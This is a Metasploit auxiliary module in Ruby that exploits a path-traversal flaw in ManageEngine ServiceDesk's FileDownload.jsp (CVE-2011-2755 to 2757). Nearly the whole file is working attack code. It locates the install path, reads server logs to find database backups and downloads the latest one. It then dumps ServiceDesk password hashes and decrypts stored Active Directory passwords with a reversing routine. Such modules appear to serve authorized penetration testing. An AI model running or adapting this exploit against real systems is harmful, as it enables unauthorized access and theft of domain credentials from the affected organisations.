##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'zip/zip'
require 'base64'

class Metasploit3 < Msf::Auxiliary
	include Msf::Exploit::Remote::HttpClient
	include Msf::Auxiliary::Report
	
	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'MnageEngine ServiceDesk database/AD account disclosure',
			'Description'    => %q{
					The vulnerability is found in FileDownload.jsp script that allows
					users to load files from remote server. The vulnerability allows
					attackers to conduct path traversal attack and get contents of the
					file located outside ServiceDesk web directory. Through this
					vulnerability an attacker can download backup of system database 
					that often contains Active Directory account.  Module decrypts AD 
					account password (password is encrypted with reversible encryption).
					Account is used to access Active Directory data for further usage
					in ServiceDesk.
			},
			'Author'         =>
				[
					'PT Research Center', # Original discovery
					'Yuri Goltsev <ygoltsev@ptsecurity.ru>',      # Metasploit module
					'https://twitter.com/ygoltsev',      # Metasploit module
				],
			'License'        => MSF_LICENSE,
			'References'     =>
				[
					['CVE', 'CVE-2011-2755'],
					['CVE', 'CVE-2011-2756'],
					['CVE', 'CVE-2011-2757'],
					['URL', 'http://www.ptsecurity.ru/advisory1.aspx'],
					['URL', 'http://ptresearch.blogspot.com/2011/07/servicedesk-security-or-rate.html'],
				],
			'Privileged'     => true,
			'Platform'       => 'win',
			'Version'        => '$Revision$',
			'Targets'        => [[ 'Automatic', { }]],
			'DisclosureDate' => 'Jul 11 2011',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('URI', [true, "ManageEngine ServiceDesk directory path", "/"]),
				OptString.new('INSTALL_PATH', [ false, 'Local path to folder where ServiceDesk installed','']),
				OptString.new('BACKUP_DIR', [ false, 'Local path to folder in ServiceDesk path where backups located','backup\\']),
			], self.class)
	end

	def check
		res = send_request_raw({
			'uri' => datastore['URI']
		})

		if (res and res.body =~ /ManageEngine ServiceDesk Plus<\/a><span>&nbsp;&nbsp;\|&nbsp;&nbsp;(\d).(\d).(\d)</)
			ver = [ $1.to_i, $2.to_i, $3.to_i ]
			print_status("Remote software : ManageEngine ServiceDesk #{ver[0]}.#{ver[1]}.#{ver[2]}")

			if (ver[0] == 8 and ver[1] == 0 and ver[2] == 0)
				return 1
			elsif (ver[0] == 8 and ver[1] == 0 and ver[2] < 10 )
				return 2
			else 
				is_vuln = unknown_version_check(datastore['INSTALL_PATH'])
				if is_vuln == "your_are_not_ed_radical"
					return 3
				else
					return 2
				end
			end
		end
		return 3
		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
		rescue ::Timeout::Error, ::Errno::EPIPE
	end

	def get_install_path(user_dir)

		check_dirs = ["ManageEngine\\ServiceDesk\\","ServiceDesk\\"]
		if user_dir != '' 
			check_dirs.push(user_dir) 
		end
		
		check_files = ["COPYRIGHT","logs\\configport.txt","bin\\run.bat","server\\default\\log\\boot.log"]
		
		if datastore['URI'][-1, 1] == "/"
			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
		else
			vuln_page = datastore['URI'] + "/workorder/FileDownload.jsp?module=agent\&path=./\&delete=false\&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
		end
	
		bad_file_name_uri = vuln_page + Rex::Text.rand_text_alphanumeric(rand(1337)+1337) + ".exe"
		
		if File.exists?(Dir.tmpdir + "/bad_sd_file")
			File.delete(Dir.tmpdir + "/bad_sd_file")
		end
		
		res = send_request_raw({
			'uri' => bad_file_name_uri
		})
	
		n_file = File.open(Dir.tmpdir + '/bad_sd_file', 'w')
		n_file.write res.body 
		n_file.close
		
		bad_sd_file_size = File.size(Dir.tmpdir + "/bad_sd_file")
		File.delete(Dir.tmpdir + "/bad_sd_file")
		print_status("Retriving install path.")
		check_dirs.each do |sdDir|
			dir_is_ok = 0
			check_files.each do |sdFile|
				file_name_uri = vuln_page + sdDir + sdFile
				res = send_request_raw({
					'uri' => file_name_uri
				})
				if File.exists?(Dir.tmpdir + "/tmp_sd_file")
					File.delete(Dir.tmpdir + "/tmp_sd_file")
				end
				n_file = File.open(Dir.tmpdir + '/tmp_sd_file', 'w')
				n_file.write res.body 
				n_file.close
				tmp_sd_file_size = File.size(Dir.tmpdir + "/tmp_sd_file")
				if tmp_sd_file_size != bad_sd_file_size
					dir_is_ok = dir_is_ok + 1
				end
				if File.exists?(Dir.tmpdir + "/tmp_sd_file")
					File.delete(Dir.tmpdir + "/tmp_sd_file")
				end
			end
			
			if dir_is_ok == 4
				print_status("You are lucky! ServiceDesk installed to '#{sdDir}' directory.")
				return sdDir
			elsif dir_is_ok >= 2
				print_status("I think ServiceDesk installed to '#{sdDir}' directory.")
				return sdDir
			elsif dir_is_ok >= 1
				print_status("You are lucky if ServiceDesk installed to '#{sdDir}' directory.")
				return sdDir
			end
		end
		return 'your_are_not_ed_radical'
	end
	
	def unknown_version_check(user_dir)
		check_dirs = ["ManageEngine\\ServiceDesk\\","ServiceDesk\\"]
		if user_dir != '' 
			check_dirs.push(user_dir) 
		end
		
		check_files = ["COPYRIGHT","logs\\configport.txt","bin\\run.bat","server\\default\\log\\boot.log"]
		
		if datastore['URI'][-1, 1] == "/"
			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
		else
			vuln_page = datastore['URI'] + "/workorder/FileDownload.jsp?module=agent\&path=./\&delete=false\&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
		end
	
		bad_file_name_uri = vuln_page + Rex::Text.rand_text_alphanumeric(rand(1337)+1337) + ".exe"
		
		if File.exists?(Dir.tmpdir + "/bad_sd_file")
			File.delete(Dir.tmpdir + "/bad_sd_file")
		end
		
		res = send_request_raw({
			'uri' => bad_file_name_uri
		})
	
		n_file = File.open(Dir.tmpdir + '/bad_sd_file', 'w')
		n_file.write res.body 
		n_file.close
		
		bad_sd_file_size = File.size(Dir.tmpdir + "/bad_sd_file")
		File.delete(Dir.tmpdir + "/bad_sd_file")
		
		check_dirs.each do |sdDir|
			dir_is_ok = 0
			check_files.each do |sdFile|
				file_name_uri = vuln_page + sdDir + sdFile
				res = send_request_raw({
					'uri' => file_name_uri
				})
				if File.exists?(Dir.tmpdir + "/tmp_sd_file")
					File.delete(Dir.tmpdir + "/tmp_sd_file")
				end
				n_file = File.open(Dir.tmpdir + '/tmp_sd_file', 'w')
				n_file.write res.body 
				n_file.close
				tmp_sd_file_size = File.size(Dir.tmpdir + "/tmp_sd_file")
				if tmp_sd_file_size != bad_sd_file_size
					dir_is_ok = dir_is_ok + 1
				end
				if File.exists?(Dir.tmpdir + "/tmp_sd_file")
					File.delete(Dir.tmpdir + "/tmp_sd_file")
				end
			end
			
			if dir_is_ok == 4
				return sdDir
			elsif dir_is_ok >= 2
				return sdDir
			elsif dir_is_ok >= 1
				return sdDir
			end
		end
	
		return 'your_are_not_ed_radical'
	end
	
	
	
	def get_server_out_logs(install_dir)
		vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
		bad_file_name_uri = vuln_page + install_dir + "server\\default\\log\\serverout_ed_radical.txt"
		res = send_request_raw({
			'uri' => bad_file_name_uri
		})
		if File.exists?(Dir.tmpdir + "/tmp_sd_file")
			File.delete(Dir.tmpdir + "/tmp_sd_file")
		end
		n_file = File.open(Dir.tmpdir + '/tmp_sd_file', 'w')
		n_file.write res.body 
		n_file.close
		bad_sd_file_size = File.size(Dir.tmpdir + "/tmp_sd_file")
		if File.exists?(Dir.tmpdir + "/tmp_sd_file")
			File.delete(Dir.tmpdir + "/tmp_sd_file")
		end
		
		i = 0
		while i <= 10 do
			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
			file_name_uri = vuln_page + install_dir + "server\\default\\log\\serverout#{i}.txt"
			
			res = send_request_raw({
				'uri' => file_name_uri
			})
			if File.exists?(Dir.tmpdir + "/serverout#{i}.txt")
				File.delete(Dir.tmpdir + "/serverout#{i}.txt")
			end

			n_file = File.open(Dir.tmpdir + "/serverout#{i}.txt", 'w')
			n_file.write res.body 
			n_file.close
		
			sd_file_size = File.size(Dir.tmpdir + "/serverout#{i}.txt")
			if sd_file_size == bad_sd_file_size
				File.delete(Dir.tmpdir + "/serverout#{i}.txt")
				return i
			else 
				print_status("We got 'server\\default\\log\\serverout#{i}.txt'.")
			end
			i += 1
		end
	end

	def parse_serverout_logs(i)
		backup_files = Array.new
		i -= 1
		while i >=0 do
			if File.exists?(Dir.tmpdir + "/serverout#{i}.txt")
				n_file = File.open(Dir.tmpdir + "/serverout#{i}.txt", 'r')
				while (line = n_file.gets)
					if /\[(\d+):(\d+):(\d+):(\d+)\]\|\[(\d+)-(\d+)-(\d+)\]\|\[SYSOUT\](.*)BACKUPDIR=(.*), ATTACHMENT=(.*)/.match line 
						l = $10
						end_of_file = $5 + "_"+ $6 +"_"+ $7 +"_"+ $1 +"_"+ $2 +".data"
						if /false, DATABASE(.*)/.match $10
							backup_name = "backup_servicedesk_" + "buildNum_database_" + end_of_file
							backup_files.push(backup_name)
						else
							backup_name = "backup_servicedesk_" + "buildNum_fullbackup_" + end_of_file
							backup_files.push(backup_name)
						end
					end
					if /: Build number(.*): (\d+)\|/.match line
						buildNum = $2
					end
				end
				n_file.close
				if File.exists?(Dir.tmpdir + "/serverout#{i}.txt")
					File.delete(Dir.tmpdir + "/serverout#{i}.txt")
				end
			end
			i -= 1
		end

		backups = Array.new
		backup_files.each do |bF|
			if /(.*)buildNum(.*)/.match bF
				fN = $1 + buildNum + $2
				backups.push(fN)
			end
		end
		return backups
	end

	def base_deconverter(xstr)
		xstr = xstr.gsub('Z','000')
		base = Array.new

		ind = 0
		bs_count = 48
		while bs_count < 59
			base[ind] = bs_count.chr.to_s
			bs_count += 1
			ind += 1
		end
		ind -= 1
		bs_count = 97
		while bs_count < 124
			base[ind] = bs_count.chr.to_s
			bs_count += 1
			ind += 1
		end
		ind -= 1
		bs_count = 65
		while bs_count < 90
			if bs_count.chr.to_s == "I"
				ind -= 1
			end
			base[ind] = bs_count.chr.to_s
			bs_count += 1
			ind += 1
		end

		answer = ""
		k = 0
		j = xstr.size/6
		j = j.to_i
		while k < j
			xpart=xstr[6*k..6*k+5]
			i = 0
			xpos = ""
			startnum = 0
			while i < 5
				isthere = 0
				pos = 0
				xalpha = xpart[i,1]
				while isthere == 0
					if base[pos] == xalpha
						xpos = xpos + pos.to_s
						isthere = 1
						if pos == 0
							if startnum == 0
								answer << startnum.to_s
							end
						else
							startnum = 1
						end
					end
					pos += 1
				end
				i += 1
			end

			isthere = 0
			pos = 0
			reminder = 0
			while isthere == 0
				if xpart[5,1] == base[pos]
					reminder = pos
					isthere = 1
				end
				pos += 1
			end
			
			if xpos.to_s == "00000"
				if reminder != 0
					tempo = reminder.to_s
					temp1 = answer.to_s[0,answer.size-tempo.size]
					answer = temp1 + tempo
				end
			else
				answer << (xpos.to_i * 60 + reminder.to_i).to_s
			end
			k += 1
		end
		if xstr.size % 6 != 0
			xend = xstr[6*k..xstr.size]
			xpos = ''
			if (xend.size > 1)
				i = 0
				startnum = 0

				while i < xend.size - 1
					isthere = 0
					pos = 0
					xalpha = xend[i,1]
					while isthere == 0
						if base[pos] == xalpha
							isthere = 1
							xpos = xpos + pos.to_s
							if pos == 0
								if startnum == 0
									answer << startnum.to_s
								end
							else
								startnum = 1
							end
						end
						pos += 1
					end
					i += 1
				end
				isthere = 0
				pos = 0
				while isthere == 0
					xalpha = xend[i,1]
					if xalpha == base[pos]
						reminder = pos
						isthere = 1
					end
					pos += 1
				end
				answer << (xpos.to_i * 60 + reminder.to_i).to_s
			else
				isthere = 0
				pos = 0 
				while isthere == 0
					xalpha = xstr[6*k..xstr.size]
					if xalpha == base[pos]
						isthere = 1
						reminder = pos
					end
					pos += 1
				end
				answer << reminder.to_s
			end
		end
		answer = answer.to_s
		strbits = answer.size / 2
		intbits = strbits.to_i
		fin = ""
		i = 0
		while i < answer.size / 2
			a = answer[2*i,2]
			b = a.to_i + 28
			fin = fin + b.chr
			i += 1
		end
		fin = fin.reverse
		return fin
	end
	
	def get_accounts(file_name_uri)
		if datastore['URI'][-1, 1] == "/"
			vuln_page = datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
		else
			vuln_page = datastore['URI'] + "/workorder/FileDownload.jsp?module=agent\&path=./\&delete=false\&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\"
		end
	
		bad_file_name_uri = vuln_page + Rex::Text.rand_text_alphanumeric(rand(1337)+1337) + ".exe"
		
		if File.exists?(Dir.tmpdir + "/bad_sd_file")
			File.delete(Dir.tmpdir + "/bad_sd_file")
		end
		
		res = send_request_raw({
			'uri' => bad_file_name_uri
		})
	
		n_file = File.open(Dir.tmpdir + '/bad_sd_file', 'w')
		n_file.write res.body 
		n_file.close
		
		bad_sd_file_size = File.size(Dir.tmpdir + "/bad_sd_file")
		File.delete(Dir.tmpdir + "/bad_sd_file")
		
		
		domain_accs = Array.new
		res = send_request_raw({
			'uri' => file_name_uri
		})
		
		if File.exists?(Dir.tmpdir + "/lastbackup.data")
			File.delete(Dir.tmpdir + "/lastbackup.data")
		end

		n_file = File.new(Dir.tmpdir + "/lastbackup.data","w")
		n_file.binmode
		n_file.write res.body
		n_file.rewind
		n_file.close
		if bad_sd_file_size < File.size(Dir.tmpdir + "/lastbackup.data")
			Zip::ZipFile.open(Dir.tmpdir + "/lastbackup.data", Zip::ZipFile::CREATE) {
			|zipfile|
				# domain accounts here
				p2d =Array.new
				d2d =Array.new
				d_info = zipfile.read("domaininfo.sql")
				d_i = Array.new
				d_i = d_info.split("\n")
				d_i.each do |line|
					if /\((\d+),(.*)'(.*)',(.*),(.*),(.*),(.*)\);/.match line
						i=$1.to_i
						d2d[i]=$3
					end
				end
				p_info = zipfile.read("passwordinfo.sql")
				p_i = Array.new
				p_i = p_info.split("\n")
				p_i.each do |line|
					if /\((\d+),(.*)'(.*)',(.*)'(.*)'\);/.match line
						i = $1.to_i
						p2d[i] = $3
					end
				end
				d_login_info = zipfile.read("domainlogininfo.sql")
				d_l_i = Array.new
				d_l_i = d_login_info.split("\n")
				d_l_i.each do |line|
					if /\((\d+),(.*)'(.*)', (\d+)\);/.match line		
						domain_id = $1.to_i
						login = $3
						password_id = $4.to_i
						follow_me = d2d[domain_id] + "\\" + login + " : " + base_deconverter(p2d[password_id])
						domain_accs.push(follow_me)
					end
				end
				
				# servicedesk accounts here
				accounts = Array.new
				login_info = zipfile.read("aaalogin.sql")
				l_i = Array.new
				l_i = login_info.split("\n")
				l_i.each do |line|
					if /(.*)\((\d+), (\d+), N\'(.*)\',(.*)\);/.match line
						i=$2.to_i
						accounts[i]=$4
					end
				end
				passwords = Array.new
				password_info = zipfile.read("aaapassword.sql")
				p_i = Array.new
				p_i = password_info.split("\n")
				p_i.each do |line|
					if /(.*)\((\d+), N\'(.*)\', N\'(.*)\', N'(.*)', (\d+),(.*)\);/.match line
						i=$2.to_i
						tmp = Array.new
						tmp = Base64.decode64($3).unpack('H*')
						md5hash = ''
						tmp.each do |aa|
							md5hash = aa
						end
						passwords[i]= md5hash + ":" + $5
					end
				end

				full_accounts = Array.new		
				acc_pwd_info = zipfile.read("aaaaccpassword.sql")
				a_p_i = Array.new
				a_p_i = acc_pwd_info.split("\n")
				t = 0
				a_p_i.each do |line|
					if /(.*)\((\d+), (\d+)\);/.match line
						acc_id=$2.to_i
						pwd_id=$3.to_i
						full_accounts[t] = accounts[acc_id] + ":" + passwords[pwd_id]
						t += 1
					end
				end
				if full_accounts.size > 0
					print_status("ServiceDesk user accounts (algorithm - md5($pass.$salt)): (username:md5hash:salt)")
					full_accounts.each do |line|
						tmp = Array.new
						tmp = line.split(":")
						report_auth_info(
							:host  => datastore['RHOST'],
							:port => datastore['RPORT'],
							:sname => 'http',
							:user => tmp[0],
							:pass => tmp[1] + ":" + tmp[2],
							:active => true
						)
						print_good(line)
					end
				end
			}
		else
			print_status("Latest backup not found.")
		end
		
		
		if File.exists?(Dir.tmpdir + "/lastbackup.data")
			File.delete(Dir.tmpdir + "/lastbackup.data")
		end
		return domain_accs
	end

	def run
		is_ok = check
		if is_ok == 1 or is_ok == 2
			backup_dir = datastore['INSTALL_PATH']
	
			install_dir = get_install_path(backup_dir)
			
			if install_dir == 'your_are_not_ed_radical' 
				print_status("Install path not found. Try to play with 'INSTALL_PATH' variable.")
			else 
				i=get_server_out_logs(install_dir)
				if i == 0 
					print_status("No one of serverout logs found.")
				else 
					backups = Array.new
					backups = parse_serverout_logs(i)
					print_status("Downloading latest backup of ServiceDesk database.")
					vuln_page = "http://" + datastore['RHOST'] + ":" + datastore['RPORT'] + datastore['URI'] + "workorder/FileDownload.jsp?module=agent&path=./&delete=false&FILENAME=..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\..\\" + install_dir + datastore['BACKUP_DIR']
					domain_accounts = Array.new
					domain_accounts = get_accounts(vuln_page + backups.last)
					if domain_accounts.size > 0
						print_status("Active Directory accounts (DOMAIN\\USERNAME : PASSWORD) :")	
						domain_accounts.each do |acc|
							tmp = Array.new
							tmp = acc.split(" : ")
							report_auth_info(
								:host  => datastore['RHOST'],
								:port => 445,
								:sname => 'smb',
								:user => tmp[0],
								:pass => tmp[1],
								:active => true
							)
							print_good(acc)
						end
					else 
						print_status("Latest database does not contains any domain accouns.\n    You can download other backups by your self and check they out for\n    domain accounts in domaininfo, passwordinfo and domainlogininfo tables.\n    For more information, visit http://ptresearch.blogspot.com/2011/07/servicedesk-security-or-rate.html page.")
					end
					print_status("INFO :")
					print_status("Also, you can download any backup using web browser :)")
					backups.each do |a|
						print_good(vuln_page+a)
					end
				end
			end
		else
			print_line("Host is not vulnerable.")
		end
	end
end
